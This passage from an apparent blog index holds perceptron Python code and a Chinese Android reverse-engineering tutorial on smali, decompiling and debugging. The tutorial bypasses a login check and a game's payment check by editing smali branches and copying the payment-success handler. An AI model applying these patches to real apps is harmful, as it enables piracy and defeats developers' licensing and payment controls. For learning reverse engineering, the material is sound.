tmp=label_i*self.a*data_i\n  #reshape()用来将tmp转化成权重的格式\n  tmp=tmp.reshape(self.w.shape)\n  #更新w和b\n  self.w=tmp+self.w\n  self.b=self.b+label_i*self.a\n \n def train(self):\n  isFind=False\n  while not isFind:\n   count=0\n   for i in range(self.numsamples):\n       #x[i,:]表示读取x数组中的第i行所有元素\n    tmpY=self.sign(self.w,self.b,self.x[i,:])\n    if tmpY*self.y[i]<=0:#如果是一个误分类实例点\n     print ('误分类点为：',self.x[i,:],'此时的w和b为：',self.w,self.b)\n     count+=1\n     self.update(self.y[i],self.x[i,:])#用误分类点更新w和b\n   if count==0:\n    print ('最终训练得到的w和b为：',self.w,self.b)\n    isFind=True\n  return self.w,self.b\n \n#画图描绘\nclass Picture:\n def __init__(self,data,w,b):\n  self.b=b\n  self.w=w\n  #plt.figure(1)是新建一个名叫 Figure1的画图窗口\n  plt.figure(1)\n  #标题，横竖坐标轴的名字和字体大小为14\n  plt.title('Perceptron Learning Algorithm',size=14)\n  plt.xlabel('x0-axis',size=14)\n  plt.ylabel('x1-axis',size=14)\n \n  #从0-5中生成100个数，返回一个列表\n  xData=np.linspace(0,5,100)\n  yData=self.expression(xData)\n  #plt.plot()是在画图窗口里具体绘制横轴为xData，纵轴为yData的红线，标签为sample data\n  plt.plot(xData,yData,color='r',label='sample data')\n \n  #将样本点绘制在图中，标记默认圆圈\n  plt.scatter(data[0][0],data[0][1],s=50)\n  plt.scatter(data[1][0],data[1][1],s=50)\n  plt.scatter(data[2][0],data[2][1],s=50,marker='x')\n  plt.scatter(data[3][0],data[3][1],s=50,marker='x')\n\n  #保存图片为2d.png，dpi为75\n  plt.savefig('2d.png',dpi=75)\n \n  #这个不懂\n def expression(self,x):\n  y=(-self.b-self.w[0]*x)/self.w[1]#注意在此，把x0，x1当做两个坐标轴，把x1当做自变量，x2为因变量\n  return y\n \n def Show(self):\n  plt.show()\n \n \nif __name__ == '__main__':\n samples,labels=createdata()    #将createdata的两个返回值分别赋给samples和labels\n myperceptron=Perceptron(x=samples,y=labels)\n weights,bias=myperceptron.train()\n Picture=Picture(samples,weights,bias)\n Picture.Show()\n```\n\n```python\n#利用Python实现感知机算法的对偶形式\n# -*- encoding:utf-8 -*-\n \n\n \nimport numpy as np\nimport matplotlib.pyplot as plt\n \n#1、创建数据集\ndef createdata():\n samples=np.array([[3,-3],[4,-3],[1,1],[1,2]])\n labels=np.array([-1,-1,1,1])\n return samples,labels\n \n#训练感知机模型\nclass Perceptron:\n def __init__(self,x,y,a=1):\n  self.x=x\n  self.y=y\n  #返回1行4列的全0数组，即alpha=(0,0,0,0)\n  self.w=np.zeros((1,x.shape[0]))\n  self.b=0\n  self.a=1#学习率\n  self.numsamples=self.x.shape[0]\n  self.numfeatures=self.x.shape[1]\n  self.gMatrix=self.cal_gram(self.x)\n \n def cal_gram(self,x):\n     #生成一个4行4列的全0数组\n  gMatrix=np.zeros((self.numsamples,self.numsamples))\n  for i in range(self.numsamples):\n   for j in range(self.numsamples):\n       #从x1x1到xnxn做向量内积\n    gMatrix[i][j]=np.dot(self.x[i,:],self.x[j,:])\n  return gMatrix\n \n def sign(self,w,b,key):\n     #这里的w相当于aplpha,w*y与矩阵key列的所有元素做向量内积\n  y=np.dot(w*self.y,self.gMatrix[:,key])+b\n  return int(y)\n \n def update(self,i):\n     #将alpha中第i个的元素加上学习率\n  self.w[i,]=self.w[i,]+self.a\n  self.b=self.b+self.y[i]*self.a\n \n def cal_w(self):\n     #最终权重w\n  w=np.dot(self.w*self.y,self.x)\n  return w\n \n def train(self):\n  isFind=False\n  while not isFind:\n   count=0\n   for i in range(self.numsamples):\n    tmpY=self.sign(self.w,self.b,i)\n    if tmpY*self.y[i]<=0:#如果是一个误分类实例点\n     print ('误分类点为：',self.x[i,:],'此时的w和b为：',self.cal_w(),',',self.b)\n     count+=1\n     self.update(i)\n   if count==0:\n    print ('最终训练得到的w和b为：',self.cal_w(),',',self.b)\n    isFind=True\n  weights=self.cal_w()\n  return weights,self.b\n \n#画图描绘\nclass Picture:\n def __init__(self,data,w,b):\n  self.b=b\n  self.w=w\n  plt.figure(1)\n  plt.title('Perceptron Learning Algorithm',size=14)\n  plt.xlabel('x0-axis',size=14)\n  plt.ylabel('x1-axis',size=14)\n \n  xData=np.linspace(0,5,100)\n  yData=self.expression(xData)\n  plt.plot(xData,yData,color='r',label='sample data')\n \n  plt.scatter(data[0][0],data[0][1],s=50)\n  plt.scatter(data[1][0],data[1][1],s=50)\n  plt.scatter(data[2][0],data[2][1],s=50,marker='x')\n  plt.scatter(data[3][0],data[3][1],s=50,marker='x')\n  plt.savefig('2d.png',dpi=75)\n \n def expression(self,x):\n  y=(-self.b-self.w[:,0]*x)/self.w[:,1]\n  return y\n \n def Show(self):\n  plt.show()\n \n \nif __name__ == '__main__':\n \n samples,labels=createdata()\n myperceptron=Perceptron(x=samples,y=labels)\n weights,bias=myperceptron.train()\n Picture=Picture(samples,weights,bias)\n Picture.Show()\n```\n\n","categories":["算法"],"tags":["Python","机器学习"]},{"title":"Android逆向入门教程","url":"/posts/15be101a.html","content":"\n# 1. 初识APK、Dalvik字节码以及Smali\n\n后缀名为`.apk`是安卓手机app的格式。它的实质是一个ZIP压缩包，将它的后缀名修改为`.zip`便可以看到内部的文件结构。解压出来后一般有以下文件：\n\n<!--more-->\n\n| 文件                | 作用                                                         |\n| ------------------- | ------------------------------------------------------------ |\n| asset文件夹         | 资源目录1，asset和res都是资源目录但有所区别                  |\n| lib文件夹           | so库存放位置，一般由NDK编译得到，常见于使用游戏引擎或JNI native调用的工程中 |\n| META-INF文件夹      | 存放工程一些属性文件，例如Manifest.MF                        |\n| res文件夹           | 资源目录2，asset和res都是资源目录但有所区别                  |\n| AndroidManifest.xml | Android工程的基础配置属性文件                                |\n| classes.dex         | Java代码编译得到的Dalvik VM能直接执行的文件                  |\n| resources.arsc      | 对res目录下的资源的一个索引文件，保存了原工程中strings.xml等文件内容 |\n| 其他文件夹 etc.     |                                                              |\n\n## 1.1 asset VS. res\n\nres目录下的资源文件在编译时会自动生成索引文件(R.java)，在Java代码中用R.xxx.yyy来引用；而asset目录下的资源文件不需要生成索引，在Java代码中需要用AssetManager来访问。\n\n一般来说，除了音频和视频资源(需要放在raw或asset下)，使用Java开发的Android工程使用到的资源文件都会放在res下；使用C++游戏引擎(或使用Lua Unity3D等)的资源文件均需要放在asset下。\n\n## 1.2 Dalvik字节码\n\nDalvik字节码是学习破解的基础。Dalvik是Google专门为Android操作系统设计的一个虚拟机，经过深度的优化。虽然Android上的程序是使用Java来开发的，但是Dalvik和标准的Java虚拟机JVM还是两回事。Dalvik VM是基于寄存器的，而JVM是基于栈的；Dalvik有专属的文件执行格式dex(dalvik executable)，而JVM则执行的是Java字节码。Dalvik VM比JVM速度更快，占用空间更少。\n\n通过Dalvik的字节码不能直接看到原来的逻辑代码，这是需要借助如Apktool或dex2jar+jd-gui工具来帮助查看。但是，需要注意的是最终我们修改APK需要操作的文件是`.smali`文件，而不是导出来的Java文件重新编译。\n\n## 1.3 Smali\n\nSmali是破解的重中之重。Smali，Baksmali分别是指安卓系统里的Java虚拟机(Dalvik)所使用的一种。dex格式文件的汇编器，反汇编器。其语法是一种宽松式的Jasmin/dedexer语法，而且它实现了`.dex`格式所有功能(注解，调试信息，线路信息等)。\n\n当对APK文件进行反编译后，便会生成此类的文件。在Dalvik字节码中，寄存器都是32位的，能够支持任何类型；64位类型(Long/Double)用2个寄存器表示。Dalvik字节码有两种类型：原始类型、引用类型(包括对象和数组)。\n\n| 原始类型简写 | 原始类型 |\n| ------------ | -------- |\n| B            | byte     |\n| C            | char     |\n| D            | double   |\n| F            | float    |\n| I            | int      |\n| J            | long     |\n| S            | short    |\n| V            | void     |\n| Z            | boolean  |\n| [XXX         | array    |\n| Lxxx/yyy     | object   |\n\n数组的表示方式是：在基本类型前加上中括号`[`，例如int数组和float数组分别表示为：`[I`，`[F`；对象的表示则以`L`作为开头，格式是`Lpackage/objectName;`(注意必须有个分号跟在后面)，例如String对象在Smali中为：`Ljava/lang/String;`，其中java/lang对应java.lang包，String就是定义在该包中的一个对象。\n\n或许有人问，既然类是用`LpackageName/objectName;`来表示，那类里面的内部类又如何在smali中引用呢？`LpackageName/objectName$subObjectName;`，也就是在内部类前加`$`符号。\n\n方法的定义一般为：\n\n​\t\t\t\t\t\t\t\tFunc-Name(Para-Type1Para-Type2Para-Type3...)Return-Type\n\n注意参数与参数之间没有任何分隔符。\n\n| 方法                                               | 意义                                              |\n| -------------------------------------------------- | ------------------------------------------------- |\n| hello ()V                                          | void hello()                                      |\n| hello (III)Z                                       | boolean hello(int, int, int)                      |\n| hello (Z[I[ILjava/lang/String;J)Ljava/lang/String; | String hello(boolean, int[], int[], String, long) |\n\n### 1.3.1 Smali基本语法\n\n| 基本语法                | 含义              |\n| ----------------------- | ----------------- |\n| .field private isFlag:Z | 定义变量          |\n| .method                 | 方法              |\n| .parameter              | 方法参数          |\n| .prologue               | 方法开始          |\n| .line 123               | 此方法位于第123行 |\n| invoke-super            | 调用父函数        |\n| const/high16 v0, 0x7f03 | 把0x7f03赋值给v0  |\n| invoke-direct           | 调用函数          |\n| return-void             | 函数返回void      |\n| .end method             | 函数结束          |\n| new-instance            | 创建实例          |\n| input-object            | 对象赋值          |\n| iget-object             | 调用对象          |\n| invoke-static           | 调用静态函数      |\n\n### 1.3.2 条件跳转分支\n\n| 用法                  | 含义                            |\n| --------------------- | ------------------------------- |\n| if-eq vA, vB, :cond_0 | 如果vA等于vB则跳转到:cond_0     |\n| if-ne vA, vB, :cond_0 | 如果vA不等于vB则跳转到:cond_0   |\n| if-lt vA, vB, :cond_0 | 如果vA小于vB则跳转到:cond_0     |\n| if-gt vA, vB, :cond_0 | 如果vA大于vB则跳转到:cond_0     |\n| if-ge vA, vB, :cond_0 | 如果vA大于等于vB则跳转到:cond_0 |\n| if-le vA, vB, :cond_0 | 如果vA小于等于vB则跳转到:cond_0 |\n| if-eqz vA, :cond_0    | 如果vA等于0则跳转到:cond_0      |\n| if-nez vA, :cond_0    | 如果vA不等于0则跳转到:cond_0    |\n| if-ltz vA, :cond_0    | 如果vA小于0则跳转到:cond_0      |\n| if-gtz vA, :cond_0    | 如果vA大于0则跳转到:cond_0      |\n| if-gez vA, :cond_0    | 如果vA大于等于0则跳转到:cond_0  |\n| if-lez vA, :cond_0    | 如果vA小于等于0则跳转到:cond_0  |\n\n### 1.3.3 Smali中的包信息\n\n`.class public Lcom/aaaaa;`：是com这个package下的一个类aaaaa\n\n`.super Lcom/bbbbb;`：继承自com.bbbbb这个类\n\n`.source \"ccccc.java\"`：由ccccc.java编译得到的smali文件\n\n一般来说在smali文件中是这样子的：\n\n```java\n# annotations\n.annotation system Ldalvik/annotation/MemberClasses;\nvalue={\nLcom/aaa$qqq;,\nLcom/aaa$www;\n}\n.end annotation\n```\n\n这个声明是内部类的声明：aaa这个类它有两个成员内部类——qqq和www。\n\n### 1.3.4 Smali中的成员变量\n\n格式：`.field public/private [static][final] varName:<类型>`\n\n对于不同的成员变量也有不同的指令。一般来说，获取的指令有：iget, sget, iget-boolean, sget-boolean, iget-object, sget-object等。操作的指令有：iput, sput, iput-boolean, sput-boolean, iput-object, sput-object等。\n\n没有`-object`后缀的表示操作的成员变量对象是基本数据类型，带`-object`表示操作的成员变量是对象类型。特别地，boolean类型则使用带`-boolean`的指令操作。\n\n例1：\n\n```\nsget-object v0, Lcom/aaa;->ID:Ljava/lang/String;\n```\n\nsget-object就是用来获取变量值并保存到紧接着的参数的寄存器中，本例中，它获取ID这个String类型的成员变量并放到v0这个寄存器中。注意，前面需要该变量所属的类的类型，后面需要加一个冒号和该成员变量的类型，中间的“->”表示所属关系。\n\n例2：\n\n```\niget-object v0, p0, Lcom/aaa;->view:Lcom/aaa/view;\n```\n\n可以看到iget-object指令比sget-object多了一个参数，就是该变量所在类的对象，p0即“this”。\n\n获取array的话可以用aget和aget-object，指令使用方法和上述一致。\n\n例3：put指令的使用和get指令是统一的如下：\n\n```\nconst/4 v3, 0x0\nsput-object v3, Lcom/aaa;->timer:Lcom/aaa/timer;\n```\n\n相当于`this.timer=null;`。\n\n注意，这里是因为赋值object所以是null；若是boolean的话应该是0。\n\n例4：\n\n```\n.local v0, args:Landroid/os/Message;\nconst/4 v1, 0x12\niput v1, v0, Landroid/os/Message;->what:l\n```\n\n相当于`args.what=18;`(args是Message的对象)。\n\n### 1.3.5 Smali中函数的调用\n\nsmali中的函数和成员变量一样也分为两种类型，分别为direct和virtual之分。那么direct method和virtual method有什么区别呢？\n\n简单来说，direct method就是private函数，其余的public和protected函数都属于virtual method。所以在调用函数时，有invoke-direct，invoke-virtual，另外还有invoke-static、invoke-super以及invoke-interface等几种不同的指令。\n\n当然其实还有invoke-XXX/range 指令的，这是参数多于4个的时候调用的指令，比较少见，了解下即可。\n\n#### invoke-static\n\n用于调用static函数的。\n\n例如：\n\n```\ninvoke-static {}, Lcom/aaa;->CheckSignature()Z\n```\n\n这里注意到invoke-static后面有一对大括号“{}”，其实是调用该方法的实例+参数列表，由于这个方法既不需参数也是static的，所以{}内为空。\n\n再看一个：\n\n```\nconst-string v0, \"NDKLIB\" \ninvoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V\n```\n\n这个是调用static void System.loadLibrary(String)来加载NDK编译的so库用的方法，同样也是这里v0就是参数“NDKLIB”了。\n\n#### invoke-super\n\n调用父类方法用的指令，一般用于调用onCreate、onDestroy等方法。\n\n#### invoke-direct\n\n调用private函数。\n\n```\ninvoke-direct {p0}, Landroid/app/TabActivity;-><init>()V\n```\n\n这里init()就是定义在TabActivity中的一个private函数。\n\n#### invoke-virtual\n\n用于调用protected或public函数，同样注意修改smali时不要错用invoke-direct或invoke-static。\n\n```\nsget-object v0, Lcom/dddd;->bbb:Lcom/ccc;\ninvoke-virtual {v0, v1}, Lcom/ccc;->Messages(Ljava/lang/Object;)V\n```\n\nv0是bbb:Lcom/ccc，v1是传递给Messages方法的Ljava/lang/Object参数。\n\n#### invoke-xxxxx/range\n\n当方法的参数多于5个时（含5个），不能直接使用以上的指令，而是在后面加上“/range”，range表示范围，使用方法也有所不同。\n\n```\ninvoke-direct/range {v0 .. v5}, Lcmb/pb/ui/PBContainerActivity;->h(ILjava/lang/CharSequence;Ljava/lang/String;Landroid/content/Intent;I)Z\n```\n\n需要传递v0到v5一共6个参数，这时候大括号内的参数采用省略形式，且需要连续。\n\n### 1.3.6 Smali中函数返回的结果的操作\n\n在Java代码中调用函数和返回函数结果可以用一条语句完成，而在Smali里则需要分开来完成，在使用上述指令后，如果调用的函数返回非void，那么还需要用到move-result（返回基本数据类型）和move-result-object（返回对象）指令：\n\n```\nconst-string v0, \"Eric\"\ninvoke-static {v0}, Lcmb/pbi;->t(Ljava/lang/String;)Ljava/lang/String;\nmove-result-object v2\n```\n\nv2保存的就是调用t方法返回String字符串。\n\n### 1.3.7 Smali中函数实体分析--if函数分析\n\n```java\n.method private ifRegistered()Z\n    .locals 2\t//在这个函数中本地寄存器的个数，2个\n    .prologue\n    const/4 v0, 0x1     // v0赋值为1\n    .local v0, tempFlag:Z\t\n    if-eqz v0, :cond_0            // 判断v0是否等于0，等于0则跳到cond_0执行\n    const/4 v1, 0x1            // 符合条件分支\n    :goto_0\t//标签\n    return v1\t//返回v1的值\n    :cond_0\t//标签\n    const/4 v1, 0x0            // cond_0分支\n    goto :goto_0\t//跳到goto_0执行 即返回v1的值  这里可以改成return v1  也是一样的\n.end method\n```\n\n### 1.3.8 Smali中函数实体分析--for函数分析\n\n```java\nconst/4 v0, 0x0   //v0 = 0;\n.local v0, i:I\n:goto_0\nif-lt v0, v3, :cond_0     //  v0小于v3 则跳到cond_0并执行分支 :cond_0\nreturn-void\n:cond_0                // 标签\niget-object v1, p0, Lcom/aaa/MainActivity;->listStrings:Ljava/util/List;        // 引用对象\nconst-string v2, \"Eric\"\ninvoke-interface {v1, v2}, Ljava/util/List;->add(Ljava/lang/Object;)Z    // List是接口, 执行接口方法add\nadd-int/lit8 v0, v0, 0x1　　　　// 将第二个v0寄存器中的值，加上0x1的值放入第一个寄存器中, 实现自增长\ngoto :goto_0                // 回去:goto_0标签\n```\n\n### 1.3.9 课后习题\n\n翻译成Java代码。\n\n```java\n.local 4                   //本地寄存器4个，即v0,v1,v2,v3\nconst/4 v2, 0x1            //4字节常量v2=1\nconst/16 v1, 0x10          //16字节常量v1=16\n:local v1, \"length\":I      //本地寄存器int length=v1\nif-nez v1，:cond_1        //如果v1不等于0，这跳转至cond_1\n:cond_0                    //cond_0标签\n:goto_0                    //goto_0标签\nreturn v2                  //返回v2的值\n:cond_1                    //开始执行cond_1标签代码\nconst/4 v0,0x0             //4字节常量v0=0\n:local v0, \"i\":I           //本地寄存器int i=v0\n:goto_1                    //开始执行goto_1标签代码\nif-lt v0, v1, :cond_2      //如果v0小于v1,则跳转至cond_2\nconst/16 v3,0x28           //接上：如果v0大于等于v1，则执行下面语句： 16字节常量v3=40\nif-le v1,v3, :cond_0       //接上：如果v1小于等于v3,则跳转至cond_0,即返回v2的值\nconst/4 v2, 0x0            //接上：如果v1大于v3,则4字节常量v2=0\ngoto:goto_0                //跳转至goto_0,即返回v2的值\n:cond_2                    //cond_2标签\nxor-int/lit8 v1, v1, 0x3b  //将第二个v1寄存器中的值与0x3b（59）进行异或运算，得到的值赋值给第一个v1寄存器中\nadd-int/lit8 v0, v0, 0x1   //将第二个v0寄存器中的值加上0x1(1)，所得的值放入第一个v0寄存器中\ngoto:goto_1                //跳转值goto_1标签，这里可以看到cond_2实际上是一个for循环，而不是简单的IF判断\n```\n\n```java\nv2 = 1;\nv1 = 16;\nif (v1 != 0)\n{\n    v0 = 0;\n\tfor(v0 < v1)\n    {\n\t\tv1 = v1 ^ 59;\n\t\tv0 = v0 + 1;\n\t}\n\tv3 = 40;\n\tif(v1 <= v3)\n\t{\n        return v2;\n\t}\n\tv2 = 0;\n\treturn v2;\n}\n```\n\n## 1.4 寄存器\n\n在smali里的所有操作都必须经过寄存器来进行：\n\n- 本地寄存器用v开头数字结尾的符号来表示，如v0, v1, v2...\n- 参数寄存器则使用p开头数字结尾的符号来表示，如p0, p1, p2...\n\n特别注意的是，p0不一定是函数中的第一个参数，在非static函数中，p0代指“this”，p1表示函数的第一个参数，p2表示函数的第二个参数...而在static函数中p0才对应第一个参数(因为Java的static方法中没有this方法)。\n\n### 1.4.1 简单对象分析\n\n```java\nconst/4 v0, 0x1\niput-boolean v0, p0, Lcom/aaa;->IsRegistered:Z\n```\n\n它使用了本地寄存器v0，并把值0x1存到v0中。用iput-boolean这个指令把v0中存的值存放到com.aaa.IsRegistered这个成员变量中。即相当于：`this.IsRegistered=true;`。\n\n# 2. 破解第一个Android程序 \n\n破解Android程序需要静态反编译程序Android Killer，打开后第一步配置JDK的安装路径。\n\n{% asset_img 配置jdk.png 配置jdk %}\n\n从 https://down.52pojie.cn/Tools/Android_Tools/ShakaApktool_3.0.0-20170503-release.jar 下载ShakaApktool_3.0.0-20170503-release.jar，将它放到`AndroidKiller_v1.3.1\\bin\\apktool\\apktool`目录下，按照下图完成操作。\n\n{% asset_img 更改apktool.png 更改apktool %}\n\n将需要反编译的`.apk`文件拖进Android Killer后会自动反编译，但最后显示“正在反编译APK源码，请稍等...”时可能会卡住，需要关闭软件再次打开。\n\n{% asset_img 异常.png 异常 %}\n\n找到历史工程重新打开`.apk`文件，点击入口即可看到smali文件。\n\n{% asset_img 成功反编译.png 成功反编译 %}\n\n如果经常卡住可以试试替换AK目录下的`rtl230.bpl` https://www.52pojie.cn/thread-658341-1-1.html 。\n\n{% asset_img smali流程分析.png smali流程分析 %}\n\n既然了解了流程，就可以动手破解程序了。\n\n第一种：知道了账户密码，可直接拿那个账户密码登录。\n\n```\n用户名：hfdcxy\n密码：1234\n```\n\n第二种：将验证账户密码的两条跳转语句修改。\n\n```java\nif-eqz v0, :cond_0\t\t->\tif-nez v0, :cond_0\nif-eqz v0, :cond_0\t\t->\tif-nez v0, :cond_0\n```\n\n第三种：直接将验证账户密码的两条跳转语句删除。\n\n第四种：用goto语句直接跳到登录成功处。\n\n```java\n    move-result v0\n    \n    goto :goto_3\t\t\t#添加goto\n\n    if-eqz v0, :cond_0\n\n    const-string v0, \"1234\"\n\n    invoke-virtual {p2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z\n\n    move-result v0\n\n    if-eqz v0, :cond_0\n\n    .line 30\n    :goto_3\t\t\t\t\t#添加goto\n    const-string v0, \"\\u767b\\u5f55\\u6210\\u529f\"\t\t#Unicode编码，“登录成功”\n```\n\nsmali修改完成后 Ctrl+S 保存，点击左上角的编译。\n\n{% asset_img 编译成功.png 编译成功 %}\n\n下载雷电模拟器 http://www.ldmnq.com/ 充当手机，可以在电脑上运行`.apk`文件，找到雷电模拟器设备，安装。\n\n{% asset_img 安装.png 安装apk %}\n\n然后在雷电模拟器中运行程序，输入错误的用户名和密码会提示登录成功，说明破解成功。\n\n# 3. 破解第一个Android游戏\n\n运行一下程序，发现购买会出现“支付失败”字样，其Unicode为`\\u652F\\u4ED8\\u5931\\u8D25`。拖入AK反编译，按照下图搜索字符串，但没有找到。\n\n{% asset_img 搜索失败.png 搜索失败 %}\n\n再找“失败”，可直接在搜索框输入“失败”，再点左下角的编码转换即可转换为Unicode码。找到很多有关“失败”的字符串，一一排除。最后找到一个“购买失败”。\n\n{% asset_img 购买失败.png 购买失败 %}\n\n再上下看看可以看到有“购买取消”、“购买成功”等字样。如果看smali难看懂，可以转换成java源码，但转换的源码可读性比较差，还是建议读smali，而且修改必须是在smali里修改才可以成功编译。\n\n{% asset_img 转换java源码.png 转换java源码 %}\n\n```java\n.method public payResultCancel()V\n...\n.end method\t\t#以上为支付取消的代码\n    \n.method public payResultFalse()V\n...\n.end method\t\t#支付失败\n    \n.method public payResultSuccess()V\n...\n.end method\t\t#支付成功\n```\n\n首先来个简单粗暴的方法，直接将`public void payResultSuccess()`方法里的代码全都复制到`public void payResultCancel()`和`public void payResultFalse()`中。再删除可能会产生费用的危险权限：在`AndroidManifest.xml`里搜索（或者直接搜索）`android.permission.SEND_SMS` 和 ` android.permission.CALL_PHONE `，删掉 `<uses-permission android:name=\"android.permission.SEND_SMS\"/>` 和 `<uses-permission android:name=\"android.permission.CALL_PHONE\"/>` 即可。\n\n第二种方法，再观察一下代码，到底是哪里开始分岔到“购买成功”、“购买取消”、“购买失败”的呢？搜索payResultFalse找到有跳转处的地方。\n\n{% asset_img 修改代码.png 修改代码 %}\n\n同上，再删除可能会产生费用的危险权限，编译。\n\n# 4. AS动态调试smali代码\n\n下载Android Studio，这里有个非常大的坑耗了我两天时间，由于在官网下载不了，导致我去别的地方下载了无数版本的AS，最后安装smalidea插件造成各种问题。\n\n解决办法：把官网链接https改为http即可。\n\nhttp://redirector.gvt1.com/edgedl/android/studio/install/2021.1.1.22/android-studio-2021.1.1.22-windows.exe\n\n动态调试需要smalidea插件，下载最新版的`smalidea-0.06.zip`压缩包。最后直接导入插件，不要解压。安装、导入自行百度。可以新建一个项目直接连入模拟器看AS是否能够正常运行。第一次新建项目花费时间长一点，我不会说我新建一个项目花了15分钟！！！\n\n将`.apk`文件拖进AK反编译成`.smali`文件，文件入口为` hfdcxy.com.myapplication.MainActivity`。在`application`标签里找` android:debuggable=\"true\" `这句代码。如果没有这句代码就调试不了，如果是`false`则改为`true`，重新编译签名。将新编译好的`.apk`安装在模拟器上。\n\n{% asset_img debuggertrue.png debuggertrue %}\n\n在`.apk`文件右键，打开文件路径。\n\n{% asset_img 打开文件路径.jpg 打开文件路径 %}\n\n把整个project目录复制到某处，用AS导入。给smali目录设置Sources Root。\n\n{% asset_img sourcesroot.jpg sourcesroot %}\n\nRun->Edit configurations->+->Remote JVM Debug->设置Name，设置端口号为8700。\n\n{% asset_img 设置remote.png 设置remote %}\n\n打开CMD，运行以下命令，将会显示以下信息。\n\n```\nC:\\Users\\dell>adb devices\nList of devices attached\nemulator-5554   device\n\nC:\\Users\\dell>adb shell am start -D -n hfdcxy.com.myapplication/hfdcxy.com.myapplication.MainActivity\nStarting: Intent { cmp=hfdcxy.com.myapplication/.MainActivity }\n```\n\n如果显示“'adb' 不是内部或外部命令，也不是可运行的程序或批处理文件。”请看 https://www.cnblogs.com/plsmile/p/11172693.html\n\n执行完第二条adb后，模拟器进入调试页面，记下PID为2160。不要点模拟器任何东西！！\n\n{% asset_img 调试页面.png 调试页面 %}\n\n绑定远程调试窗口：\n\n```\nC:\\Users\\dell>adb forward tcp:8700 jdwp:2160\n8700\n```\n\n回到AS设置断点，Run->Attch Debugger to Android Process\n\n{% asset_img 下断.png 下断点 %}\n\n{% asset_img 下断2.png 下断点 %}\n\n回到模拟器，输入用户名和密码，点击登录。AS停在断点处，看到我们刚才输入的变量。\n\n{% asset_img 断点3.png 下断点 %}\n\n单步F8，运行F9，与OD一样。可以下多几个断点，看寄存器的值，但需要自己添加想看的寄存器。\n\n{% asset_img 寄存器值.png 寄存器值 %}\n\n# 5. 在smali代码中插入Log\n\n新建一个项目在MainActivity.java里面写一段switch case语句。注意，新建时语言要选择Java。\n\n```java\npublic class MainActivity extends AppCompatActivity\n{\n    String name;\n    @Override\n    protected void onCreate(Bundle savedInstanceState)\n    {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        name = \"v5le0n9\";\n        switch(name)\n        {\n            case \"v5le0n9\":\n                Log.i(\"Hello\",\"v5le0n9哈哈\");\n                break;\n            case \"l30n9ry0n\":\n                Log.i(\"Hello\",\"l30n9ry0n啦啦\");\n                break;\n            default:\n                Log.i(\"Hello\",\"没有符合的name值\");\n                break;\n        }\n    }\n}\n```\n\n点击三角符号运行，或Shift+F10，程序被安装到模拟器上。在Logcat查找“hello”，找到对应Log。\n\n{% asset_img Log.png Log %}\n\n要想`.apk`文件保存在电脑上，按照下图操作。\n\n{% asset_img buildapk.jpg build apk %}\n\n在`D:\\Java\\Android\\MyApplication\\app\\build\\intermediates\\apk\\debug`找到`.apk`文件。拖进AK反编译。点击入口进入MainActivity.smali，分析代码。\n\n注意，能修改smali文件的前提是smali文件没有丢失，否则修改了也不能编译成功。再注意，为什么我们编写出来的程序放到AK反编译会显示文件已丢失？可能是因为Android Studio2.0+的Instant Run导致的。\n\n解决方法：关闭Android Stuio的Instant Run：File -> Setting -> Build, Execution，Deployment -> Debugger -> HotSwap ，取消选中，点击OK。点击Build -> APK重新打包。\n\n{% asset_img instantrun.png instantrun %}\n\n结果还是不行！！直接生成release版本的apk试试，build ->  Geberate signed apk -> APK。如果没有keystore则需要创建一个新的。\n\n创建keystore看 https://blog.csdn.net/qq_24349695/article/details/78540982\n\n在点击finish时又给我抛出错误：`Error:Execution failed for task ‘:app:lintVitalRelease’`，解决方法：\n\n在app的build.gradle里的android{}中添加如下代码，然后再次运行Generate Signed Apk。例如： \n\n```java\nandroid{\n    lintOptions {\n        checkReleaseBuilds false\n        abortOnError false\n    }\n}\n```\n\n这次用release版本终于没有丢失smali文件了。已知代码运行出现的Log是`:cond_1`里面的信息，所以在`:cond_1`添加我们想看到的信息，保存编译。\n\n{% asset_img 添加smali代码.png 添加smali代码 %}\n\nAK连上模拟器，因为模拟器之前有我们在AS直接安装的程序，所以先卸载，再编译安装修改过的程序。回到AS就可以看到多了一条Log信息，但AS中的java语言并没有被修改。\n\n{% asset_img ASLog.png AS中多了一条Log信息 %}\n\n**所以Log有什么用呢？很多情况下插入Log是为了打印出程序中某个变量的值。**\n\n用以下程序完成三个任务：\n\n1. 添加Log打印出fun2,fun3的值 (其实就是函数的返回值)\n\n2. 添加Log打印出fun3里面String类型str的值\n\n3. 添加Log打印出fun3里面int类型value3的值 \n\n```java\n//MainActivity.java\npublic class MainActivity extends AppCompatActivity {\n \n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        fun1();\n        fun2();\n        fun3();\n        Log.i(\"这个值是\",String.valueOf(fun1()));\n \n    }\n    public int fun1()\n    {\n        int value = Test.value;\n        return value;\n    }\n    public int fun2()\n    {\n        int value2 = Test.value2;\n        return value2;\n    }\n    public String fun3()\n    {\n        String str = Test.str;\n        String str2 = Test.str2;\n        int value3 = Test.value3;\n        return str2;\n    }\n}\n```\n\n```java\n//Test.java\npublic class Test {\n    public static int value = 888;\n    public static int value2 = 777;\n    public static int value3 = 666;\n    public static String str = \"www.52pojie.cn\";\n    public static String str2 = \"码完代码去看东方明珠\";\n}\n```\n\n{% asset_img 1.png 运行程序 %}\n\n一样release版本拿去AK反编译。\n\n任务一：添加Log打印出fun2, fun3的值\n\n{% asset_img 2.png 打印fun1的值 %}\n\n`.line 17`是执行Log代码的内容，有趣的是在AS中`Log.i(\"这个值是\",String.valueOf(fun1()));`刚好是第17行。\n\n由于fun2和fun1的返回值类型一致，所以可直接复制这些代码，区别只是将fun1改为fun2。\n\n{% asset_img 3.png 返回fun2的值 %}\n\nfun2和fun3函数都是int类型，通过`String.valueOf`这个函数转换成的String类型。但是fun3这个函数本身就是String类型，这里如果还通过`String.valueOf`函数转换的话程序会报错。所以将执行`String.valueOf`的代码去掉即可。\n\n{% asset_img 4.png 返回fun3的值 %}\n\n保存->卸载->编译->安装。\n\n{% asset_img 5.png Log显示fun1,fun2,fun3返回值 %}\n\n任务二：添加Log打印出fun3里面String类型str的值\n\n{% asset_img 6.png fun3中的smali代码 %}\n\n翻译一下就是：\n\n```java\npublic String fun3()\n{\n    String v0 = str;\n\tString v0 = str2;\n\tint v1 = value3;\n\treturn v0;\n}\n```\n\n即str的值被str2覆盖了，所以可以直接删掉`.line 